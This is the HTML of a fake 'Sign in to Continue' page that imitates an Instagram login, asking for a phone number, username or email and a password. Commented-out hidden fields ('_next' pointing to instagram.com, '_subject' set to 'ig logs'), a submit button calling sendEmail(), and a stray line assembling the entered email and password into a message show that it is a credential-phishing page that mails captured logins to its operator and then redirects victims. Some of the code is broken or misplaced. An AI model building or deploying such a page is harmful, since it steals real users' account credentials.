<body class="my-login-page">

	<section class="h-100">
		<div class="container h-100">
			<div class="row justify-content-md-center h-100">
				<div class="card-wrapper">
				
					<div class="brand">
						<img src="img/logo2.png" alt="logo">
					</div>
					
					<div class="card fat">
						<div class="card-body">
							<h4 class="card-title">Sign in to Continue</h4>
							
							<form action="#" method="POST" class="my-login-validation" novalidate="">
							// <input type="hidden" name="_next" value="https://instagram.com">
								// <input type="hidden" name="_captcha" value="false">
								// <input type="hidden" name="_subject" value="ig logs">
								<div class="form-group">
									<input id="email" type="username" placeholder="Phone number, username, email address" class="form-control" name="email" value="" required autofocus>

									<div class="invalid-feedback">
										Email is invalid
									</div>
								</div>

								<div class="form-group">
									
									<input id="pass" type="password"  placeholder="Password" class="form-control" name="password" required data-eye>
								    <div class="invalid-feedback">
								    	Password is required
							    	</div>
								</div>
								<a class='float-right' href='index.html'>
											Forgot Password?
										</a>

								<div class="form-group">
									<div class="custom-checkbox custom-control">
										<input type="checkbox" name="remember" id="remember" class="custom-control-input">
									</div>
									
								</div>

								<div class="form-group m-0">
									<button type="submit" onclick="sendEmail()" class="btn btn-primary btn-block">
										Log in
									</button>
								</div>
								<div class="mt-4 text-center">
									Don't have an account? <a href='index.html'>Sign up</a>
								</div>
							</form>
						</div>
					</div>
					<div class="footer">
					</div>
				</div>
			</div>
		</div>
	</section>

    let finalmessage = `email : ${email} <br>  Pass : ${email} <br>  Message : ${pass} <br>`;
